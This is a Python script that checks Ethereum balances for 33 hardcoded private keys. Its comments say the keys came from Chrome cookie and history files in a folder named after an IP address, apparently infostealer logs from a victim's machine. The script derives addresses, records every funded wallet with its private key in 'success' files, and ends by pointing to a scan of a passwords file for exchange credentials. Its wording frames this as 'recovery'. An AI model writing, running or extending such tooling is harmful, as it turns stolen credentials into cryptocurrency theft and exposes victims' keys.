#!/usr/bin/env python3
"""
Check balances for the massive collection of private keys from Chrome Default directory
"""

from enhanced_balance_checker import EnhancedBalanceChecker
from eth_keys import keys as eth_keys
import json
import time

def main():
    """Check all discovered private keys from the 156.34.227.214 directory"""
    
    # All unique private keys discovered from Chrome Default Cookies.txt and History.txt
    private_keys = [
        "086351855d829d0cf113fc6914263d67d32bb203bfcca1249eec6b592a53d1b2",
        "1551f2a7eac5024668a1bcaf75389d611176928035adf750fbfff14ace9e836e",
        "1a6549924485469fea494ca4d358cae48f0e4c3c589b211f000fbd80dbf1dcc2",
        "1ab0d2564d3ac1d1ff58befeac1e16df727a9a7bd140fd51899bdc8a275aca04",
        "24432E58CAB5ED47F7A3B5297473EAC8DE23B0D60607F23FB91AAAEAA3193A85",
        "25bc10c663172c94bbf74cd3bc604945a702e35c37a7a01bcebdb4340e6bc276",
        "2AB312ACDDC6917A4649160FA7C7A7AB4ED8620D530DCF47BAF03E4FA6F1C472",
        "363f84a78d610ce7998d05b6245f62d137b5ef2e17ca4815dd25414a182b4ea8",
        "397FBFCC842A6AC6A11943726274D183C25BF883650BA93985B74593C18873B4",
        "4ccce1adc03e2960c0e04c97a98a29f0a3092501c72acf63d4330118d8007edf",
        "5237e0ac54727ebff74c7f460b7d6f09db120e7e200e91cb00e1b139f44c28c5",
        "5A553A8C87999784CF9C6ADE67D094C6870BA2649DA38136CF5F04EB9DB51DE1",
        "67a44b0871a4c65a6c780c9ed7d6c083f1018a815558355b3f74440251ab3cae",
        "67f4e50075c88bec9b93a5a76f3a4fe976556b8865f3af665c4bc8e548956492",
        "693948587145F80C8390C1676B8471682E8C96416ED30A5F3BBEDCECBCBBC8A3",
        "7344ebba3486b53126f147aedd4486418052165d06fc4c0f0557b28139bb7d78",
        "7e5fb5611ae912c60c5941afad54b0540dee4a1349f00f3c7571ab63dd5c8fd3",
        "8508cfe6ebb7db32ee6361573a49f8c713c58719665c8149a1cffbd207a6e62e",
        "a420a475a16068159cdde5b44dcc2389755d2a281616a7e2efe191cff64fd721",
        "a96c4365c7d308d3376afe0272ee2b463518c44d17621f80b7dec6f060bcb687",
        "ac0f8818744a317585cba921332ccd132fc9d26796bfd452fb454c769c46cff1",
        "AEE34F78B2D891FE15AF86781177F261F1BAD4FCFEAB2DC2D8671B480B9AC286",
        "b535de2723b365d1521d82c8975c5d3577e4034ea74af99f2259278e5eb7327b",
        "b9f760fa8359c4aea9bf518b13b75f2b5d8c88a244bb749c970ee85038ac2891",
        "bf7fb98865f8eb33a737c6a6b8694945a70273c7fe378cf05eab79617f95fc77",
        "bf91ce91abc34deb3503017c0ced932f93f0ad12a25475848a6a86a258153aa7",
        "c56d3701d30bb320b469685aa87747d62ad01c4d6b772d14f7ecfdcef207e4e5",
        "D0F17C32CE5992311B5BB4EC48D8801512C7034B1E3A5FB1C47EFE97053EA833",
        "d100f7df1b38527c59f2a01ce658dbfb8b696949c12c1469164f408167d4a1ca",
        "e4a84d110f69836b0fb200615fba40faf5e41e6b40c6195a9e2aa38dc8aa0644",
        "e7d4076382e9f221ef6aefac39e3e6f8a29ba8ea2745f73ed9739145c9fe7858",
        "f5a4f7d86b5d9a9291fcc6d3bf089e1364791e6bf401fd6d8e6df701bcb6e08f",
        "f93c1a452bcd97d97d63e02f730c6bb1d6a8e055511957a83480af740f923edd"
    ]
    
    print("🚀 MASSIVE PRIVATE KEY BALANCE CHECK")
    print("=" * 80)
    print(f"🔑 Checking {len(private_keys)} unique private keys from Chrome Default")
    print("📂 Source: /home/admin/Downloads/[CA]156.34.227.214/[CA]156.34.227.214")
    print("=" * 80)
    
    # Initialize balance checker
    checker = EnhancedBalanceChecker()
    funded_wallets = []
    total_checked = 0
    
    for i, private_key in enumerate(private_keys, 1):
        print(f"\n🔑 Key {i}/{len(private_keys)}: {private_key[:8]}...{private_key[-8:]}")
        
        # Check if valid Ethereum private key
        try:
            eth_private_key = eth_keys.PrivateKey(bytes.fromhex(private_key.lower()))
            eth_address = eth_private_key.public_key.to_checksum_address()
            print(f"   📍 ETH Address: {eth_address}")
            
            # Check Ethereum balance
            eth_result = checker.check_ethereum_balance_multiple_apis(eth_address)
            if eth_result.get('success'):
                balance = eth_result.get('balance_eth', 0)
                print(f"   💰 ETH Balance: {balance}")
                if balance > 0:
                    funded_wallets.append({
                        'private_key': private_key,
                        'currency': 'ETH',
                        'address': eth_address,
                        'balance': balance,
                        'source': 'Chrome Default Browser Data'
                    })
                    print(f"   🎉🎉🎉 FUNDED ETH WALLET FOUND! 🎉🎉🎉")
                    print(f"       Balance: {balance} ETH")
                    print(f"       Address: {eth_address}")
                    print(f"       Private Key: {private_key}")
                    
                    # Immediately save this critical find
                    with open(f'URGENT_FUNDED_WALLET_{i}.json', 'w') as f:
                        json.dump({
                            'private_key': private_key,
                            'address': eth_address,
                            'balance': balance,
                            'currency': 'ETH',
                            'discovery_time': time.time(),
                            'source_directory': '/home/admin/Downloads/[CA]156.34.227.214/[CA]156.34.227.214'
                        }, f, indent=2)
                else:
                    print(f"   ❌ ETH: {balance}")
            else:
                print(f"   ❌ ETH balance check failed")
            
            total_checked += 1
            
        except Exception as e:
            print(f"   ❌ Invalid Ethereum key: {str(e)[:50]}")
        
        # Rate limiting to avoid overwhelming APIs
        if i % 5 == 0:
            print(f"   ⏳ Pausing briefly to respect API limits...")
            time.sleep(2)
    
    # Final summary
    print("\n" + "=" * 80)
    print("📊 FINAL COMPREHENSIVE RESULTS")
    print("=" * 80)
    print(f"🔑 Total private keys processed: {len(private_keys)}")
    print(f"✅ Successfully checked: {total_checked}")
    print(f"💰 FUNDED WALLETS FOUND: {len(funded_wallets)}")
    
    if funded_wallets:
        print(f"\n🚨🚨🚨 CRITICAL SUCCESS - {len(funded_wallets)} FUNDED WALLETS! 🚨🚨🚨")
        total_value_eth = 0
        for wallet in funded_wallets:
            print(f"\n💎 WALLET {funded_wallets.index(wallet) + 1}:")
            print(f"   Currency: {wallet['currency']}")
            print(f"   Address: {wallet['address']}")
            print(f"   Balance: {wallet['balance']} {wallet['currency']}")
            print(f"   Private Key: {wallet['private_key']}")
            total_value_eth += wallet['balance']
        
        print(f"\n💰 TOTAL VALUE: {total_value_eth} ETH")
        
        # Save comprehensive results
        with open('MASSIVE_SUCCESS_FUNDED_WALLETS.json', 'w') as f:
            json.dump({
                'total_funded_wallets': len(funded_wallets),
                'total_value_eth': total_value_eth,
                'discovery_timestamp': time.time(),
                'source_directory': '/home/admin/Downloads/[CA]156.34.227.214/[CA]156.34.227.214',
                'wallets': funded_wallets
            }, f, indent=2)
        
        print(f"\n🔐 CRITICAL: All results saved to MASSIVE_SUCCESS_FUNDED_WALLETS.json")
        print("🚨 SECURE THESE PRIVATE KEYS IMMEDIATELY!")
        print("🏆 THIS IS A MAJOR RECOVERY SUCCESS!")
        
    else:
        print("\n❌ No funded wallets found in this batch")
        
    # Check for exchange credentials in passwords
    print(f"\n🔍 Also checking All Passwords.txt for exchange credentials...")

if __name__ == "__main__":
    main()
